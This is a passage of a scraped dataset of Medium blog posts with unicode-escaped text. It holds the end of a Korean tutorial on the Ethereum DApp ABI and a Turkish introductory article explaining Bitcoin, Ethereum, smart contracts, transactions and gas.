\uad6c\uc870\ub97c \uac00\uc9c0\uace0 \uc788\uace0, \uc774\ub7f0 \ud568\uc218\uac00 \uc788\uc5b4\u2019 \uc774\ub7f0 \ub0b4\uc6a9\uc744 \uc790\ubc14\uc2a4\ud06c\ub9bd\ud2b8\uc5d0\uc11c \uc54c \uc218 \uc788\ub3c4\ub85d \uc81c\uacf5\ud558\ub294 \uac83\uc785\ub2c8\ub2e4.\uc774\ub7f0 \uc5b8\uc5b4\ub098 \ud50c\ub7ab\ud3fc\uc5d0 \ub300\ud55c \uc758\uc874\uc131 \uc5c6\uc774, \uc5b4\ub514\uc11c\ub098 \ud574\ub2f9 \uc778\ud130\ud398\uc774\uc2a4\uc5d0 \ub300\ud55c \uc815\ubcf4\ub97c \uc81c\uacf5\ud560 \uc218 \uc788\uac8c\ub054 \ud558\ub294 \ud615\ud0dc\ub97c Application Binary Interface\ub77c\uace0 \ud569\ub2c8\ub2e4. DApp\uc5d0\uc11c \uc774 ABI\uac00 \uc911\uc694\ud55c \uc774\uc720\ub294, \ubc14\ub85c \ud568\uc218 \uc2e4\ud589\uacfc \uc774\ub354, \uc989 \ub3c8\uc774 \ubc00\uc811\ud55c \uc5f0\uad00\uc774 \uc788\uae30 \ub54c\ubb38\uc785\ub2c8\ub2e4. \u2018\uc774\ub354\ub9ac\uc6c0\uc5d0\uc11c DApp\uc744 \uc0ac\uc6a9\ud558\ub824\uba74 \ub3c8\uc744 \ub0b4\uc57c \ud55c\ub2e4!\u2019\ub77c\uace0 \ud588\ub358 \uac83, \ub2e4\ub4e4 \uae30\uc5b5\ud558\uc2dc\uc8e0?ABI\uc5d0 \uc788\ub294 \ud568\uc218 \ud558\ub098\ub97c \uc608\uc2dc\ub85c \ubcf4\uaca0\uc2b5\ub2c8\ub2e4.\uc704 \uc608\uc2dc\uc5d0\uc11c \ubcfc \uc218 \uc788\ub4ef\uc774, ABI\uc5d0\ub294 \ud568\uc218\uba85(name), \ud568\uc218\uc758 \uc778\uc218(inputs) \ub4f1 \ud568\uc218\uc5d0 \ub300\ud55c \uc124\uba85\uc774 \uc788\uc2b5\ub2c8\ub2e4. \uac70\uae30\uc5d0 \uc194\ub9ac\ub514\ud2f0\ub9cc\uc758 \ud2b9\uc9d5\uc778, payable\uacfc stateMutability\ub97c \ud3ec\ud568\ud558\uc8e0.payable\uc774 true\uba74 \ub0b4\uac00 \uc774 \ud568\uc218\ub97c \uc0ac\uc6a9\ud574\uc11c \ub0b4\uac00 \uac00\uc9c4 \uc774\ub354\ub97c \ud574\ub2f9 \ucee8\ud2b8\ub799\ud2b8\ub85c \ubcf4\ub0bc \uc218 \uc788\ub2e4\ub294 \uac83\uc744 \uc758\ubbf8\ud569\ub2c8\ub2e4. \ud06c\ub9bd\ud1a0\ud0a4\ud2f0 \uac19\uc740 DApp\uc5d0\uc11c \ub0b4 \uc774\ub354\ub97c \uc8fc\uace0 \uace0\uc591\uc774\ub97c \uc0b4 \ub54c \uc0ac\uc6a9\ud558\ub294 \ud568\uc218 \ub4f1\uc774 payable \ud568\uc218\uac00 \ub418\uaca0\uc8e0?stateMutability\uc5d0\ub294 \ub2e4\uc591\ud55c \uac12\uc774 \ub4e4\uc5b4\uac00\ub294\ub370, VisitCounter \uc608\uc81c\uc5d0\uc11c\ub294 nonpayable \uc678\uc5d0 view\ub97c \uc0ac\uc6a9\ud558\ub294 \ubd80\ubd84\uc774 \uc788\uc2b5\ub2c8\ub2e4. \ub098\uc911\uc5d0 \ub354 \uad6c\uccb4\uc801\uc73c\ub85c \uc54c\uc544\ubcfc \uac83\uc774\uc9c0\ub9cc, view \ud568\uc218\ub294 \uc2e4\ud589\ud560 \ub54c \uac00\uc2a4\ub97c \uc18c\ubaa8\ud558\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4. \uc989 \ub0b4 \ub3c8\uc744 \uc4f0\uc9c0 \uc54a\ub294\ub2e4\ub294 \uac70\uc8e0! \uc774\ub7f0 \uc911\uc694\ud55c \uc815\ubcf4\ub294 ABI\uc5d0 \ub4f1\ub85d\ud574\ub193\uace0 \uc54c\ub824\uc918\uc57c\uaca0\uc8e0? :)\uc544\uc9c1 \uc704\uc5d0\uc11c \ubcf8 \ub450 \ub0b4\uc6a9\uc774 \uc815\ud655\ud558\uac8c \uc774\ud574\uac00 \ub418\uc9c0 \uc54a\ub354\ub77c\ub3c4 \uad1c\ucc2e\uc2b5\ub2c8\ub2e4. \uc55e\uc73c\ub85c \uc62c\ub77c\uc62c \uae00\ub4e4\uc744 \ud1b5\ud574 \ud568\uaed8 \uacf5\ubd80\ud574\ub098\uac00\uc2dc\uba74 \uc870\uae08 \ub354 \uc27d\uac8c \uc774\ud574\ud558\uc2e4 \uc218 \uc788\uc744\uac70\uc5d0\uc694!D. \uba54\uc778\ub137 \ubc30\ud3ec\ubc30\ud3ec\uae4c\uc9c0 \ub108\ubb34 \ud55c \ubc88\uc5d0 \ub2e4 \uc368\ubc84\ub9ac\uba74 \uc7ac\ubbf8\uac00 \uc5c6\uaca0\uc8e0\u2026? (\uc808\ub300 \uc9c0\uae08 \uc6b0\ub9ac\uac00 \ubab0\ub77c\uc11c \uadf8\ub7ec\ub294 \uac83\uc774 \uc544\ub2c8\uc5d0\uc694\u2026)\uc774 \uae00\uc774 \uac1c\ubc1c \ud658\uacbd\uc744 \uc774\ud574\ud558\ub294 \ub370\uc5d0 \ub3c4\uc6c0\uc774 \ub418\uc5c8\ub2e4\uba74, \ub313\uae00\ub85c \uc54c\ub824\uc8fc\uc138\uc694! \uadf8\ub7fc \ub2e4\ub978 \uae00\uacfc \ud568\uaed8 \uba54\uc778\ub137 \ubc30\ud3ec\ub3c4 \ub354\uc6b1 \uc11c\ub458\ub7ec \uc5c5\ub370\uc774\ud2b8\ub97c \ud560 \uc218 \uc788\uc744 \uac83\ub9cc \uac19\uc544\uc694\u2026!\uc774 \ub2e4\uc74c \uae00\uc5d0\uc11c\ub294 \uad6c\uccb4\uc801\uc73c\ub85c \uc774 \uae00\uc5d0\uc11c \uc5b8\uae09\ub41c \ub3c4\uad6c\ub4e4\uc744 \uc5b4\ub5bb\uac8c \ud65c\uc6a9\ud558\uace0, \uc2e4\uc81c\ub85c DApp \uc744 \uac1c\ubc1c\ud558\uace0, \ubc30\ud3ec\ud558\ub294 \uacfc\uc815\uae4c\uc9c0 \uc790\uc138\ud788 \ub2e4\ub8f0 \uc608\uc815\uc785\ub2c8\ub2e4.\uae00\uc744 \ubcf4\uc2dc\uace0 \uc9c8\ubb38\uc774\ub098 \ud53c\ub4dc\ubc31\uc774 \uc788\uc73c\uc2dc\uba74 \uc5b8\uc81c\ub4e0\uc9c0 \uc54c\ub824\uc8fc\uc138\uc694!\uac10\uc0ac\ud569\ub2c8\ub2e4.Written by \uac00\uc601 & \uc2dc\uc900Team Teckle", "responses": 14, "tags": ["Dapps", "\ube14\ub85d\uccb4\uc778", "\uc774\ub354\ub9ac\uc6c0", "\uac1c\ubc1c", "Solidity"]}, {"title": "Nedir yahu \u015fu Ethereum?", "post_link": "https://medium.com/codefiction/nedir-yahu-%C5%9Fu-ethereum-f545aad58910?source=search_post", "author_name": "Mert Susur", "author_link": "https://medium.com/@mertsusur", "publish_date": "2017-08-13", "last_modified_date": "2018-05-12", "readtime": "7.59", "claps": 548, "voters": 127, "content": "Nedir yahu \u015fu Ethereum?Mert SusurFollowAug 13, 2017 \u00b7 8 min readEthereum hakk\u0131nda bir s\u00fcredir f\u0131rsat bulduk\u00e7a yay\u0131nlarda konu\u015fmaya \u00e7al\u0131\u015ft\u0131k (28. B\u00f6l\u00fcm Daha \u00e7ok AWS Lambda ve daha \u00e7ok Ethereum) ve hatta Solidity dili hakk\u0131nda giri\u015f seviyesinde bir kay\u0131t da payla\u015fm\u0131\u015ft\u0131k (Solidity 101). \u015eimdi de Ethereum\u2019un nas\u0131l \u00e7al\u0131\u015ft\u0131\u011f\u0131ndan ve DApps (Decentralized Applications) kavram\u0131ndan bahsetmek istiyorum.\u00d6ncelikle Ethereum ayn\u0131 Bitcoin gibi bir blockchain (blok zincir) teknolojisi. Bir \u00e7ok y\u00f6n\u00fcyle Bitcoin\u2019e benziyor ancak biraz daha fazlas\u0131. Bu y\u00fczden Ethereum konu\u015fmaya ba\u015flamadan \u00f6nce belki de Bitcoin\u2019den ve nas\u0131l \u00e7al\u0131\u015ft\u0131\u011f\u0131ndan bahsetmek daha do\u011fru olacakt\u0131r.Bitcoin nedir?2008 y\u0131l\u0131ndaki k\u00fcresel mali kriz ile birlikte Satoshi Nakamoto ad\u0131nda bir ki\u015fi Ekim ay\u0131nda Crypto Mail gruplar\u0131ndan bir tanesinde bir makale payla\u015farak Bitcoin ad\u0131nda dijital bir para biriminden bahsetti. (Bitcoin: A Peer-to-Peer Electronic Cash System). Satoshi Nakamoto\u2019nun ger\u00e7ek bir isim olup olmad\u0131\u011f\u0131n\u0131 hala daha bilmiyoruz, \u00e7\u00fcnk\u00fc kendisini tan\u0131yan yok. Ancak daha sonra ayn\u0131 isimle 9 Ocak 2009 tarihinde sourceforce \u00fczerinden ilk \u00e7al\u0131\u015fan istemcisini ve para birimini de yay\u0131nlad\u0131ktan sonra Bitcoin hayata ge\u00e7mi\u015f oldu. K\u0131sa bir zaman i\u00e7erisinde arkas\u0131ndaki ideoloji sayesinde kabullenildi ve \u015fu s\u0131ralarda 4000 dolar seviyesinde seyretmekte.Nakamoto\u2019nun yay\u0131nlad\u0131\u011f\u0131 makalenin ilk paragraf\u0131ndan al\u0131nt\u0131 yaparak \u00e7\u00f6zmeye \u00e7al\u0131\u015ft\u0131\u011f\u0131 sorunu \u00f6zetlemek en do\u011frusu olacakt\u0131r;Internet \u00fczerindeki ticari i\u015flemlerin neredeyse tamam\u0131 g\u00fcvenilir bir otorite olarak hizmet veren \u00fc\u00e7\u00fcnc\u00fc \u015fah\u0131s finans kurumlar\u0131na g\u00fcvenerek \u00e7al\u0131\u015fmaktad\u0131r. Her ne kadar bu sistem bir \u00e7ok i\u015flem i\u00e7in g\u00fczel \u00e7al\u0131\u015f\u0131yor olsa da hala daha g\u00fcvene dayal\u0131 bir sistemin zafiyetlerini de bar\u0131nd\u0131rmaktad\u0131r.Peki nedir bu g\u00fcvene dayal\u0131 sistemlerin zafiyetleri? \u00d6rne\u011fin 2008 mali krizini ele alal\u0131m. Alal\u0131m da bir finans uzman\u0131 olmad\u0131\u011f\u0131m i\u00e7in al\u0131nt\u0131 yaparak anlatmaya \u00e7al\u0131\u015faca\u011f\u0131m.\u2026 ABD bankalar\u0131n\u0131n kar i\u015ftah\u0131 o kadar artm\u0131\u015ft\u0131 ki krediler, kredi derecelendirme s\u00fcrecinde riskleri \u00f6l\u00e7meden umars\u0131zca verildi. Verilen kredilerin b\u00fcy\u00fck bir k\u0131sm\u0131 konut kredisi olarak verildi\u011fi i\u00e7in kredi kullananlar kredileri \u00f6demese bile s\u00fcrekli art\u0131\u015f g\u00f6steren konut fiyatlar\u0131 vard\u0131. Ve en k\u00f6t\u00fc ihtimal bankalar bu evleri sat\u0131p belki kar bile ederek konuyu kapat\u0131rlard\u0131. Bununla birlikte artan bu kredi patlamas\u0131n\u0131n sonucu olarak bankalar kaynak bulmakta g\u00fc\u00e7l\u00fck \u00e7ekiyordu. Bunun da bir \u00e7\u00f6z\u00fcm\u00fc vard\u0131 elbette. Bankan\u0131n ipotek etti\u011fi bu evleri, varl\u0131k teminatl\u0131 menkul k\u0131ymetle\u015ftirerek piyasada doland\u0131racak, kendilerine vadesi \u00e7ok da uzun olmasa bile kaynak yaratm\u0131\u015f olacaklard\u0131. Fakat d\u00fc\u015f\u00fcnmedikleri bir\u015fey vard\u0131: Konut fiyatlar\u0131 ya d\u00fc\u015ferse? Nitekim kredi alanlar kredilerin b\u00fcy\u00fck bir k\u0131sm\u0131 \u00f6denemeyince bankalar konutlara el koymu\u015f, ama 3 birim kredi verdikleri evin de\u011feri 1 birime d\u00fc\u015fm\u00fc\u015ft\u00fc. Bankac\u0131l\u0131k sekt\u00f6r\u00fc bunlardan etkilenmi\u015f, sigortac\u0131l\u0131k sekt\u00f6r\u00fc de bu \u00e7\u0131kar\u0131lan varl\u0131k teminatl\u0131 menkul k\u0131ymetleri sigortalad\u0131klar\u0131 i\u00e7in \u00e7ok ciddi zararlar vermi\u015fti\u2026Daha fazlas\u0131 i\u00e7in : http://www.bireyselyatirimci.com/2008-krizi-ve-gercek-nedenleri/\u015eu anda internet \u00fczerinden bir al\u0131\u015fveri\u015f yapmak istedi\u011finizde, kiran\u0131z\u0131 \u00f6demek istedi\u011finizde ya da \u00e7o\u011fu zaman market al\u0131\u015fveri\u015finizi yaparken bankalar\u0131 yani yukar\u0131da bahsedilen \u00fc\u00e7\u00fcnc\u00fc \u015fah\u0131s finansal kurumlar\u0131 kullan\u0131yorsunuz. Bu firmalar devletler taraf\u0131ndan reg\u00fclasyonlarla denetlendi\u011fi i\u00e7in g\u00fcvenilir olarak kabul ediyoruz. Hatta devletler kendileri denetlemelerden sorumlu olduklar\u0131 i\u00e7in bir \u00e7ok i\u015flemin bu kurumlar \u00fczerinden yap\u0131lmas\u0131n\u0131 tercih ediyorlar, \u00e7\u00fcnk\u00fc b\u00f6ylece bireylerin ya da kurumlar\u0131n gelir ve giderlerinin denetlenmesi ve vergilendirilmesi de kolayla\u015fm\u0131\u015f oluyor. Ancak bu noktada bu g\u00fcvenilir firmalar\u0131n yozla\u015fmas\u0131, devletlerin yozla\u015fmas\u0131, yolsuzluklar\u0131n ya\u015fanmas\u0131 ya da 2008 y\u0131l\u0131ndaki krizde oldu\u011fu gibi bir \u00e7ok farkl\u0131 kurumu da beraberinde bat\u0131rmas\u0131 gibi riskler ortaya \u00e7\u0131km\u0131\u015f oluyor.\u0130\u015fte Bitcoin de tam olarak bu sorunu \u00e7\u00f6zmek i\u00e7in ortaya \u00e7\u0131k\u0131yor.Peki nas\u0131l \u00e7al\u0131\u015f\u0131yor?Diyelim ki finansal bir i\u015flem yapmak istiyorum, varsayal\u0131m kiram\u0131 \u00f6demek istiyorum. Bu durumda kiram\u0131n de\u011feri kadar bir paray\u0131 ev sahibime g\u00f6ndermem gerekiyor. B\u00f6yle bir i\u015flemin bir al\u0131c\u0131s\u0131, g\u00f6ndereni ve para miktar\u0131 olacakt\u0131r. Bu i\u015flemin ger\u00e7ekle\u015fmesi ile de g\u00f6nderenin hesab\u0131ndan para azal\u0131rken, al\u0131c\u0131n\u0131n hesab\u0131nda da ayn\u0131 oranda bir para giri\u015finin ger\u00e7ekle\u015fmesi gerekir.Bunun ger\u00e7ekle\u015fmesi i\u00e7in i\u015flemi yapan ki\u015fi gerekli bilgileri doldurduktan sonra bir i\u015flem giri\u015fi yarat\u0131p bunu Bitcoin a\u011f\u0131na g\u00f6nderir. Bitcoin a\u011f\u0131 dedi\u011fimiz \u015fey asl\u0131nda bu sisteme ba\u011fl\u0131 olan istemci bilgisayarlardan olu\u015fmaktad\u0131r. A\u011fa dahil olan her bilgisayar kendisine yak\u0131n olan ba\u015fka istemcilerle ileti\u015fime ge\u00e7erek Peer-to-peer bir \u015fekilde kar\u015f\u0131l\u0131kl\u0131 veri al\u0131\u015fveri\u015fine ba\u015flarlar ve otomatik olarak a\u011f i\u00e7erisinde 2009 y\u0131l\u0131ndan bu yana yap\u0131lm\u0131\u015f olan b\u00fct\u00fcn i\u015flemleri kendi disklerine indirmeye ba\u015flarlar, yani a\u011f ile senkronize olmaya ba\u015flarlar. Evet, tarih boyunca yap\u0131lm\u0131\u015f t\u00fcm i\u015flemlerin listesi \u015feffaf bir \u015fekilde herkesin eri\u015fimine a\u00e7\u0131k durmaktad\u0131r. Hatta baz\u0131 web sitelerinden \u015fu anda yap\u0131lan i\u015flemleri canl\u0131 olarak g\u00f6rmeniz bile m\u00fcmk\u00fcn (cointicker). \u015eeffafl\u0131k konusuna birazdan geri d\u00f6nece\u011fim i\u00e7in \u015fu anda bunun ne kadar \u00f6nemli bir \u015fey oldu\u011fundan bahsetmiyorum. Birazc\u0131k sabredin l\u00fctfen!Biz \u00f6rne\u011fimize d\u00f6nelim, kira \u00f6deme i\u015flemini a\u011fdaki di\u011fer bilgisayarlarla payla\u015f\u0131yorduk de\u011fil mi? Evet! Onlar da ayn\u0131 \u015fekilde ba\u015fka bilgisayarlarla birebir olarak ba\u011fl\u0131 olduklar\u0131 i\u00e7in onlar da elden ele y\u00f6ntemi ile bu i\u015flemi onlarla payla\u015f\u0131yorlar. Burada dikkat edilmesi gereken konu \u015fu; olu\u015fturdu\u011funuz i\u015flem hen\u00fcz onaylanmad\u0131. Yani hesab\u0131n\u0131zdan hen\u00fcz para transferi ger\u00e7ekle\u015fmedi. Onay bekliyor diyebiliriz.Ayn\u0131 anda sistemde madenci denilen ba\u015fka insanlar da zor bir matematiksel problemi \u00e7\u00f6zmeye \u00e7al\u0131\u015f\u0131yorlar. Bu problemin \u00e7\u00f6z\u00fcm\u00fc \u00e7ok fazla i\u015flemci g\u00fcc\u00fc gerektirdi\u011fi i\u00e7in kolayl\u0131kla herkes taraf\u0131ndan \u00e7\u00f6z\u00fclemiyor. Hatta bu problemin \u00e7\u00f6z\u00fcm\u00fc de g\u00fcn ge\u00e7tik\u00e7e zorla\u015f\u0131yor. Bu problem \u00e7\u00f6z\u00fcld\u00fc\u011f\u00fcnde, problemi \u00e7\u00f6zen ki\u015fi bir blockchain olu\u015fturup hen\u00fcz onaylanmam\u0131\u015f i\u015flemleri bu blockchain i\u00e7ine ekliyorlar ve bu noktada i\u015fleminiz onaylan\u0131yor ve kar\u015f\u0131l\u0131kl\u0131 para transferleri ger\u00e7ekle\u015fiyor. Bu problemi \u00e7\u00f6zen ve blockchain olu\u015fturan ki\u015fi de yapt\u0131\u011f\u0131 i\u015flem kar\u015f\u0131s\u0131nda 1 bitcoin ile \u00f6d\u00fcllendiriliyor.Blockchain yani blok zinciri, ayn\u0131 bir Linked List gibi kendisinden \u00f6ncekini biliyor, yani kendisinden \u00f6nceki blok ile zincirleniyor. B\u00f6ylelikle son zinciri bilirseniz tarihin en ba\u015f\u0131na kadar gidebiliyorsunuz. Ancak iyi haber; bu i\u015flemlerin g\u00f6ndereni ve kabul edeni k\u0131s\u0131mlar\u0131nda isim de\u011fil anonim adresler yaz\u0131yor. Yani i\u015flemleri g\u00f6r\u00fcyorsunuz ancak bu i\u015flemleri kim neden yapm\u0131\u015f takip etmeniz m\u00fcmk\u00fcn de\u011fil. Bu noktada tart\u0131\u015fmak istedi\u011fim \u00e7ok fazla konu var \u00f6rne\u011fin bu sistemin zafiyetleri yok mu? E madem zor bir problem bu, o zaman bir de ben onun \u00e7\u00f6z\u00fclmesini mi bekleyece\u011fim? Ben \u2018proof of work\u2019 diye bir \u015fey duydum o neydi? gibi. Ancak yaz\u0131n\u0131n amac\u0131ndan sapmamas\u0131 i\u00e7in burada duruyorum, aksilik \u00e7\u0131kmazsa ileride yazaca\u011f\u0131m yaz\u0131larda ya da video kay\u0131tlar\u0131nda bunlara de\u011finece\u011fim.Ethereum diyorduk sen bize ne anlat\u0131yorsun!Durun durun geliyorum oraya. En ba\u015fta Bitcoin ile Ethereum\u2019un \u00e7ok benzedi\u011finden bahsetmi\u015ftim, e\u011fer bunun nas\u0131l \u00e7al\u0131\u015ft\u0131\u011f\u0131n\u0131 anlatmasayd\u0131m bundan sonra s\u00f6yleyeceklerimi anlatmak \u00e7ok zor olurdu. Yukar\u0131da \u00e7ok kabaca blockchain\u2019in ne oldu\u011fundan ve sistemin transparan \u00e7al\u0131\u015ft\u0131\u011f\u0131ndan bahsetmeye \u00e7al\u0131\u015ft\u0131m. Burada odaklanman\u0131z\u0131 istedi\u011fim bir ka\u00e7 konu var, t\u00fcm i\u015flemler \u015feffaf bir \u015fekilde herkesle payla\u015f\u0131yor ve sizin i\u015fleminizi sizin tan\u0131mad\u0131\u011f\u0131n\u0131z birisi onayl\u0131yor ve herkesle payla\u015f\u0131yor.\u0130\u015fte bu sistemin en b\u00fcy\u00fck getirisi ortada merkezi bir arac\u0131 yok. Yani devletler bu sistemi engelleyemiyor ve denetleyemiyor. Ancak kimsenin denetlemesine gerek kalmadan bu sistem transparanl\u0131\u011f\u0131 ve anonimli\u011fi sayesinde g\u00fcvene ihtiya\u00e7 duymadan sorunsuz bir \u015fekilde \u00e7al\u0131\u015f\u0131yor. Bu gibi uygulamalara \u2018Trustless\u2019 uygulamalar da deniyor. Yani g\u00fcvene ihtiya\u00e7 duymadan i\u015flemlerini ger\u00e7ekle\u015ftirebiliyorsun.Ethereum da bu sistemin neredeyse t\u00fcm \u00f6zelliklerini bar\u0131nd\u0131r\u0131yor ve \u00fczerine yeni bir \u00e7ok \u015fey ekliyor. Belki de en \u00f6nemli fark\u0131 sundu\u011fu \u2018Ak\u0131ll\u0131 Kontratlar\u2019.Yeter art\u0131k! Nedir yahu bu Ethereum?Ethereum, a\u00e7\u0131k kaynak kodlu ve herkesin kullan\u0131m\u0131na a\u00e7\u0131k blockchain teknolojisini kullanan \u2018merkezi olmayan\u2019 (Decentralized) bir uygulama \u00e7al\u0131\u015ft\u0131rma platformu. \u0130lk defa 2013 y\u0131l\u0131nda Vitalik Buterin ad\u0131nda bir yaz\u0131l\u0131mc\u0131 taraf\u0131ndan ortaya at\u0131l\u0131yor ve 2015 y\u0131l\u0131nda canl\u0131 bir sistem olarak hayata ge\u00e7iyor. \u015eu anda hala daha Ethereum kom\u00fcnitesi taraf\u0131ndan geli\u015ftirilmeye ve desteklenmeye devam ediyor. Ethereum sisteminin para birimi \u2018Ether\u2019 (ETH). \u015eu anda de\u011feri 326 dolar civar\u0131nda ancak \u00e7ok de\u011fi\u015fken seyrediyor, dolay\u0131s\u0131yla yat\u0131r\u0131m ama\u00e7l\u0131 bak\u0131ld\u0131\u011f\u0131nda epey riskli. Ancak benim ilgilendi\u011fim k\u0131sm\u0131 bu de\u011fil.Bu sistemin Bitcoin\u2019den en b\u00fcy\u00fck fark\u0131 az \u00f6nce s\u00f6yledi\u011fim gibi \u2018Smart Contract\u2019 yani ak\u0131ll\u0131 kontratlar. Bu platform EVM (Ethereum Virtual Machine) denilen bir VM sayesinde Solidity ad\u0131ndaki dili kullanarak yazd\u0131\u011f\u0131n\u0131z uygulamalar\u0131 da\u011f\u0131t\u0131k bir \u015fekilde \u00e7al\u0131\u015ft\u0131rman\u0131za olanak sa\u011fl\u0131yor. Yani kar\u015f\u0131l\u0131kl\u0131 bir i\u015flem ger\u00e7ekle\u015ftirmek istedi\u011finizde Bitcoin\u2019de oldu\u011fu gibi basit i\u015flemler yapabilmenize ek olarak bir de bu i\u015flemleri belirli kurallarla programlamaniza olanak sa\u011fl\u0131yor.Diyelim ki birisine internet \u00fczerinden \u00fcr\u00fcn sat\u0131\u015f\u0131 yapmak istiyorsunuz. \u015eu anda ebay gibi siteler al\u0131c\u0131 ve sat\u0131c\u0131 aras\u0131nda arac\u0131 olarak bir g\u00fcvence sa\u011fl\u0131yorlar. Yani \u00fcr\u00fcn gelmeden paray\u0131, para gelmeden de \u00fcr\u00fcn\u00fc de\u011fi\u015f-toku\u015f yapm\u0131yorsunuz. E\u011fer al\u0131c\u0131 belli bir s\u00fcre i\u00e7erisinde \u00fcr\u00fcn\u00fcn ula\u015fmad\u0131\u011f\u0131n\u0131 bildirmezse para sat\u0131c\u0131n\u0131n hesab\u0131na ge\u00e7iyor. Ancak aradaki arac\u0131 da bu i\u015flemden belli bir miktar komisyon al\u0131yor. \u0130\u015fte bu gibi i\u015flemleri Ethereum \u00fczerinde Solidity dilini kullanarak bir ak\u0131ll\u0131 kontrata kodlay\u0131p bu i\u015flemlerin bir arac\u0131 ile de\u011fil bu a\u011f \u00fczerinde yap\u0131lmas\u0131n\u0131 sa\u011flayabilir ve aradaki arac\u0131y\u0131 (middle man) ortadan kald\u0131r\u0131p ald\u0131\u011f\u0131 komisyondan \u00e7ok daha ucuza halledebilirdiniz. Tabi bunun gibi bir \u00e7ok kullan\u0131m alan\u0131n\u0131 \u00f6rneklemek m\u00fcmk\u00fcn.Peki nas\u0131l \u00e7al\u0131\u015f\u0131yor bu sistem?Bunu konu\u015fmadan \u00f6nce basit bir iki temel bilgiyi vermek gerekiyor.Ethereum a\u011f\u0131 i\u00e7erisinde durum yani \u0130ngilizce\u2019si ile \u2018state\u2019 hesaplarla (Account) saklan\u0131yor. Her bir hesap 20-byte\u2019l\u0131k bir adrese sahip ve i\u015flemler yani transaction\u2019lar bu 20-byte\u2019l\u0131k adresler aras\u0131nda ger\u00e7ekle\u015fiyor. Bir hesap nesnesinin bir ka\u00e7 \u00f6zelli\u011fi var;\u0130\u015flemlerin sadece bir kere ger\u00e7ekle\u015fmesini sa\u011flamak i\u00e7in tutulan bir saya\u00e7 de\u011feri; nonce.Hesaptaki Ether miktar\u0131E\u011fer mevcutsa, kontrata ait \u00e7al\u0131\u015ft\u0131r\u0131labilir kod par\u00e7as\u0131.Hesaba ait saklanan veri.Yukar\u0131daki alanlardan e\u011fer sadece Ether miktar\u0131 mevcutsa bu hesap bir dijital c\u00fczdan gibi davran\u0131rken, buna bir kod par\u00e7as\u0131 ekledi\u011finizde bir ak\u0131ll\u0131 kontrata d\u00f6n\u00fc\u015f\u00fcyor. Bu kontratlar da a\u011fa \u2018deploy\u2019 ediliyorlar. Kontratlar\u0131n kodlar\u0131 daha \u00f6nce de bahsetti\u011fim gibi, Solidity denilen bir dil ile yaz\u0131l\u0131yor. Bu yaz\u0131da buna odaklanmayaca\u011f\u0131m ancak bu dil ile ilgili bilgi almak istiyorsan\u0131z daha \u00f6nceden kaydetti\u011fim Solidity 101 video\u2019sunu izleyebilirsiniz. Yak\u0131nda daha ileri seviye video\u2019lar da Codefiction Youtube kanal\u0131ndan yay\u0131nlanacak.Ethereum a\u011f\u0131 i\u00e7erisindeki kontratlar sistem i\u00e7erisinde s\u00fcrekli ya\u015fayan nesneler. Yani siz bir kontrat olu\u015fturup bunu bir program gibi istedi\u011finiz zaman \u00fczerine tan\u0131mlad\u0131\u011f\u0131n\u0131z fonksiyonlar\u0131n\u0131 \u00e7al\u0131\u015ft\u0131rabilirsiniz. Mesela Solidity 101 video\u2019sunda anlatt\u0131\u011f\u0131m gibi ba\u015fkalar\u0131yla payla\u015fabilece\u011finiz ortak bir banka hesab\u0131 yarat\u0131p istedi\u011finiz zaman buraya g\u00fcvenilir bir \u015fekilde Ether aktarabilir ya da \u00e7ekebilirsiniz. Yapaca\u011f\u0131n\u0131z her i\u015flem bir ba\u015fkas\u0131 taraf\u0131ndan \u00e7al\u0131\u015ft\u0131r\u0131laca\u011f\u0131 i\u00e7in, \u00e7al\u0131\u015ft\u0131r\u0131lacak kodun ad\u0131m say\u0131s\u0131na ba\u011fl\u0131 olarak, belli bir miktar \u00fccret de \u00f6demeniz gerekecektir. Yani e\u011fer \u00e7al\u0131\u015ft\u0131r\u0131lacak fonksiyon \u00e7ok fazla ad\u0131mdan olu\u015fuyorsa \u00f6demeniz gereken \u00fccret de buna ba\u011fl\u0131 olarak artacakt\u0131r. Demem o ki, e\u011fer optimize bir algoritma \u00e7al\u0131\u015ft\u0131r\u0131yorsan\u0131z daha az maliyetiniz olacakt\u0131r. (Asymptotic Computational Complexity)Bir adrese para g\u00f6ndermek ya da bir adresteki kontrat\u0131n bir fonksiyonunu \u00e7a\u011f\u0131rarak bir i\u015flem ger\u00e7ekle\u015ftirmek gibi operasyonlara \u2018transaction\u2019 deniliyor. Anlam kaybolmas\u0131ndan korktu\u011fum i\u00e7in ne yaz\u0131k ki bundan sonra hep \u0130ngilizce terimleri kullanmaya ba\u015flayaca\u011f\u0131m. Transaction\u2019lar Ethereum a\u011f\u0131nda bir adresten tetiklenen imzalanm\u0131\u015f veri paketleri, yani mesajlar. Bu mesajlar i\u00e7erilerinde \u015funlar\u0131 bar\u0131nd\u0131r\u0131yorlar;Mesaj\u0131n al\u0131c\u0131s\u0131,G\u00f6ndereni tan\u0131mlayan bir dijital imza,Al\u0131c\u0131ya iletilecek Ether miktar\u0131,Hesaplarda oldu\u011fu gibi, opsiyonel bir veri saklama alan\u0131,EVM taraf\u0131ndan hesaplanan olas\u0131 maksimum i\u015flem ad\u0131m\u0131na ba\u011fl\u0131 olarak hesaplanan STARTGAS de\u011feri. Bu de\u011fer ilgili mesaj\u0131n \u00e7al\u0131\u015fmas\u0131 sonucunda ortaya \u00e7\u0131kabilecek maksimum maliyete kar\u015f\u0131l\u0131k geliyor. Ancak bu tabi ki sizin i\u015fleminizin bu kadara mal olaca\u011f\u0131 anlam\u0131na gelmiyor.G\u00f6nderen taraf\u0131ndan \u00f6denecek olan Ether miktar\u0131n\u0131 belirleyen GASPRICEBuradaki alanlardan ilk 4 tanesi Bitcoin ile ayn\u0131 \u00f6zellikleri ta\u015f\u0131yor. Ancak fark yaratan k\u0131sm\u0131 geriye kalan son iki alan. Bu alanlar Ethereum a\u011f\u0131na DOS sald\u0131r\u0131s\u0131 yap\u0131lmas\u0131n\u0131 engellemek i\u00e7in eklenmi\u015f alanlar. Yani k\u00f6t\u00fc niyetli birisinin sonsuz d\u00f6ng\u00fcye giren bir kontrat y\u00fckleyip bir madenciyi a\u011fdan d\u00fc\u015f\u00fcrmesini engellemek i\u00e7in kullan\u0131l\u0131yor. E\u011fer b\u00f6yle bir \u015fey denenirse \u00f6demesi gereken miktar \u00e7ok fazla olaca\u011f\u0131 i\u00e7in k\u00f6t\u00fc niyetli ki\u015fileri cayd\u0131r\u0131yor.GAS denilen birim ise her i\u015flem ad\u0131m\u0131na g\u00f6re hesaplan\u0131yor. Yani e\u011fer bir kontrat\u0131n bir sonraki halinde \u00e7ok fazla veri olu\u015fturulursa bu durumda \u00f6denmesi 